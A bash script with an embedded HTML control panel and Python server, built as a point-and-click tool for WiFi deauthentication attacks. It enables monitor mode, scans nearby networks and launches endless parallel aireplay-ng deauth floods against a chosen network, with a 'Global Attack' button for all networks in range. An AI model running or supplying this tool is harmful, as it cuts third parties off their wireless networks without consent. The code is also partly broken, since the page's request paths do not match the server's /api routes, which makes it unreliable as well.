#!/bin/bash

if [[ $EUID -ne 0 ]]; then 
    echo -e "\e[31m[!] Root access is required. Run this script as root.\e[0m"
    exit 1
fi

# Check for required dependencies
required=("aircrack-ng" "xterm" "python3")
for pkg in "${required[@]}"; do
    if ! dpkg -l | grep -q " $pkg "; then
        apt install -y "$pkg"
    fi
done

# Web server setup
WEB_PORT=8080
TMP_DIR=$(mktemp -d)
cat > "$TMP_DIR/index.html" <<'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Deauth Control</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: #0f0f0f; 
            color: #0f0; 
            margin: 0; 
            padding: 20px; 
        }
        .container { 
            max-width: 800px; 
            margin: 0 auto; 
            border: 1px solid #0f0; 
            padding: 20px; 
            background: #111; 
        }
        h1, h2, h3 { 
            color: #0f0; 
            border-bottom: 1px solid #333; 
            padding-bottom: 10px; 
        }
        .btn { 
            background: #0f0; 
            color: #000; 
            border: none; 
            padding: 10px 15px; 
            font-family: inherit; 
            font-weight: bold; 
            cursor: pointer; 
            margin: 5px; 
        }
        .btn:hover { background: #0c0; }
        .btn-stop { background: #f00; color: #fff; }
        .btn-stop:hover { background: #c00; }
        .status { 
            padding: 15px; 
            background: #222; 
            margin: 10px 0; 
            border-left: 3px solid #0f0; 
        }
        .log { 
            background: #000; 
            color: #0f0; 
            padding: 15px; 
            height: 200px; 
            overflow-y: auto; 
            font-family: monospace; 
            white-space: pre; 
        }
        select, input { 
            background: #222; 
            color: #0f0; 
            border: 1px solid #0f0; 
            padding: 8px; 
            font-family: inherit; 
        }
        .hidden { display: none; }
        .attack-animation {
            animation: pulse 1s infinite;
            font-size: 24px;
            text-align: center;
            padding: 10px;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi DEAUTH CONTROL PANEL</h1>
        <div class="status" id="status">Initializing system...</div>
        
        <div id="interfaceSection">
            <h2>Network Interface</h2>
            <select id="interfaceSelect"></select>
            <button class="btn" onclick="enableMonitor()">Enable Monitor Mode</button>
        </div>
        
        <div id="scanSection" class="hidden">
            <h2>Target Selection</h2>
            <button class="btn" onclick="startScan()">Scan Networks</button>
            <div id="scanResults"></div>
        </div>
        
        <div id="attackSection" class="hidden">
            <h2>Attack Control</h2>
            <div id="attackAnimation" class="hidden attack-animation">💥 ATTACK IN PROGRESS 💥</div>
            <button class="btn" id="btnStartAttack">Start Attack</button>
            <button class="btn btn-stop" id="btnStopAttack">Stop Attack & Restore</button>
        </div>
        
        <h2>System Log</h2>
        <div class="log" id="log"></div>
    </div>

    <script>
        const log = document.getElementById('log');
        const status = document.getElementById('status');
        const interfaceSelect = document.getElementById('interfaceSelect');
        const scanSection = document.getElementById('scanSection');
        const attackSection = document.getElementById('attackSection');
        const scanResults = document.getElementById('scanResults');
        const attackAnimation = document.getElementById('attackAnimation');
        const btnStartAttack = document.getElementById('btnStartAttack');
        const btnStopAttack = document.getElementById('btnStopAttack');
        
        // Add message to log
        function addLog(msg) {
            log.textContent += msg + '\n';
            log.scrollTop = log.scrollHeight;
        }
        
        // Update status message
        function updateStatus(msg) {
            status.textContent = msg;
        }
        
        // Fetch interfaces from backend
        function fetchInterfaces() {
            fetch('/interfaces')
                .then(r => r.json())
                .then(data => {
                    if (data.length === 0) {
                        updateStatus('No wireless interfaces found!');
                        return;
                    }
                    
                    interfaceSelect.innerHTML = '';
                    data.forEach(iface => {
                        const option = document.createElement('option');
                        option.value = iface;
                        option.textContent = iface;
                        interfaceSelect.appendChild(option);
                    });
                    updateStatus('Select interface and enable monitor mode');
                });
        }
        
        // Enable monitor mode
        function enableMonitor() {
            const iface = interfaceSelect.value;
            updateStatus(`Enabling monitor mode on ${iface}...`);
            fetch(`/monitor?iface=${iface}`)
                .then(r => r.json())
                .then(data => {
                    if (data.success) {
                        updateStatus(`Monitor mode enabled on ${iface}`);
                        scanSection.classList.remove('hidden');
                    } else {
                        updateStatus(`Failed: ${data.error}`);
                    }
                });
        }
        
        // Start network scan
        function startScan() {
            const iface = interfaceSelect.value;
            updateStatus(`Scanning for targets on ${iface}...`);
            fetch(`/scan?iface=${iface}`)
                .then(r => r.json())
                .then(data => {
                    if (data.success) {
                        displayScanResults(data.networks);
                        updateStatus(`Found ${data.networks.length} networks`);
                        attackSection.classList.remove('hidden');
                    } else {
                        updateStatus(`Scan failed: ${data.error}`);
                    }
                });
        }
        
        // Display scan results
        function displayScanResults(networks) {
            scanResults.innerHTML = '<h3>Detected Networks:</h3>';
            
            networks.forEach(net => {
                const div = document.createElement('div');
                div.innerHTML = `
                    <div style="margin: 10px 0; padding: 10px; background: #222;">
                        <strong>${net.essid}</strong> (BSSID: ${net.bssid}, CH: ${net.channel})
                        <button class="btn" onclick="startAttack('${net.bssid}', ${net.channel})">
                            Attack This Network
                        </button>
                    </div>
                `;
                scanResults.appendChild(div);
            });
            
            scanResults.innerHTML += `
                <div style="margin-top: 20px;">
                    <button class="btn" onclick="startAttack('ALL', 0)">
                        💣 Global Attack (All Networks)
                    </button>
                </div>
            `;
        }
        
        // Start deauth attack
        function startAttack(bssid, channel) {
            const iface = interfaceSelect.value;
            const target = bssid === 'ALL' ? 'all networks' : bssid;
            
            updateStatus(`Starting attack on ${target}...`);
            attackAnimation.classList.remove('hidden');
            btnStartAttack.disabled = true;
            
            fetch(`/attack?iface=${iface}&bssid=${bssid}&channel=${channel}`)
                .then(r => r.json())
                .then(data => {
                    if (!data.success) {
                        updateStatus(`Attack failed: ${data.error}`);
                        attackAnimation.classList.add('hidden');
                        btnStartAttack.disabled = false;
                    }
                });
        }
        
        // Stop attack and restore
        function stopAttack() {
            fetch('/stop')
                .then(r => r.json())
                .then(data => {
                    attackAnimation.classList.add('hidden');
                    btnStartAttack.disabled = false;
                    if (data.success) {
                        updateStatus(data.message);
                    } else {
                        updateStatus('Error stopping attack');
                    }
                });
        }
        
        // Set up button handlers
        btnStartAttack.onclick = () => startAttack('ALL', 0);
        btnStopAttack.onclick = stopAttack;
        
        // Initialize
        fetchInterfaces();
        addLog('System initialized. Waiting for commands...');
    </script>
</body>
</html>
HTML

# Start Python web server
start_server() {
    cat << EOF
import http.server
import socketserver
import json
import subprocess
import threading
import os
import re
import signal
from urllib.parse import urlparse, parse_qs

PORT = $WEB_PORT
web_dir = "$TMP_DIR"
os.chdir(web_dir)

attack_processes = []

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        elif self.path.startswith('/api'):
            self.handle_api()
            return
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
    
    def handle_api(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        if parsed.path == '/api/interfaces':
            self.handle_interfaces()
        elif parsed.path == '/api/monitor':
            self.handle_monitor(query)
        elif parsed.path == '/api/scan':
            self.handle_scan(query)
        elif parsed.path == '/api/attack':
            self.handle_attack(query)
        elif parsed.path == '/api/stop':
            self.handle_stop()
    
    def handle_interfaces(self):
        try:
            output = subprocess.check_output(['iw', 'dev'], text=True)
            interfaces = re.findall(r'Interface\s+(\w+)', output)
            self.wfile.write(json.dumps(interfaces).encode())
        except Exception as e:
            self.wfile.write(json.dumps([]).encode())
    
    def handle_monitor(self, query):
        iface = query.get('iface', [''])[0]
        if not iface:
            self.wfile.write(json.dumps({'success': False, 'error': 'No interface specified'}).encode())
            return
            
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, text=True)
            subprocess.run(['ip', 'link', 'set', iface, 'down'])
            subprocess.run(['iw', 'dev', iface, 'set', 'type', 'monitor'])
            subprocess.run(['ip', 'link', 'set', iface, 'up'])
            subprocess.run(['iw', 'dev', iface, 'set', 'power_save', 'off'])
            self.wfile.write(json.dumps({'success': True}).encode())
        except Exception as e:
            self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
    
    def handle_scan(self, query):
        iface = query.get('iface', [''])[0]
        if not iface:
            self.wfile.write(json.dumps({'success': False, 'error': 'No interface specified'}).encode())
            return
            
        try:
            scan_file = f"scan_{os.getpid()}"
            proc = subprocess.Popen(
                ['timeout', '10s', 'airodump-ng', '--write', scan_file, '--output-format', 'csv', iface],
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )
            proc.wait()
            
            networks = []
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    for line in f:
                        if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2},', line):
                            parts = line.split(',')
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            essid = parts[13].strip()
                            if bssid and channel and essid:
                                networks.append({'bssid': bssid, 'channel': channel, 'essid': essid})
            
            self.wfile.write(json.dumps({'success': True, 'networks': networks}).encode())
        except Exception as e:
            self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
    
    def handle_attack(self, query):
        global attack_processes
        iface = query.get('iface', [''])[0]
        bssid = query.get('bssid', [''])[0]
        channel = query.get('channel', [''])[0]
        
        if not iface or not bssid or not channel:
            self.wfile.write(json.dumps({'success': False, 'error': 'Missing parameters'}).encode())
            return
            
        try:
            # Set channel
            subprocess.run(['iw', 'dev', iface, 'set', 'channel', channel])
            
            # Start multiple attack processes
            for _ in range(3):
                proc = subprocess.Popen(
                    ['aireplay-ng', '--ignore-negative-one', '--deauth', '0', '-a', bssid, iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                attack_processes.append(proc)
            
            self.wfile.write(json.dumps({'success': True}).encode())
        except Exception as e:
            self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
    
    def handle_stop(self):
        global attack_processes
        try:
            # Stop all attack processes
            for proc in attack_processes:
                proc.terminate()
            attack_processes = []
            
            # Restore interface
            iface = "wlan0"  # Should be dynamically determined in real implementation
            subprocess.run(['ip', 'link', 'set', iface, 'down'])
            subprocess.run(['iw', 'dev', iface, 'set', 'type', 'managed'])
            subprocess.run(['ip', 'link', 'set', iface, 'up'])
            subprocess.run(['service', 'NetworkManager', 'start'])
            
            self.wfile.write(json.dumps({'success': True, 'message': 'Attack stopped'}).encode())
        except Exception as e:
            self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
EOF
}

# Start server in background
start_server | python3 - &> /dev/null &
SERVER_PID=$!
sleep 1

# Open web browser
if [ -n "$BROWSER" ]; then
    $BROWSER "http://localhost:$WEB_PORT"
elif which xdg-open &> /dev/null; then
    xdg-open "http://localhost:$WEB_PORT"
elif which gnome-open &> /dev/null; then
    gnome-open "http://localhost:$WEB_PORT"
else
    echo "Please open a browser to: http://localhost:$WEB_PORT"
fi

# Cleanup function
cleanup() {
    kill $SERVER_PID &> /dev/null
    rm -rf "$TMP_DIR"
    echo -e "\n${GREEN}Server stopped. Cleanup complete.${RESET}"
    exit 0
}

trap cleanup SIGINT

echo -e "${GREEN}Web interface started at http://localhost:$WEB_PORT${RESET}"
echo "Press Ctrl+C to stop the server and exit"

# Keep the script running
while true; do
    sleep 1
done
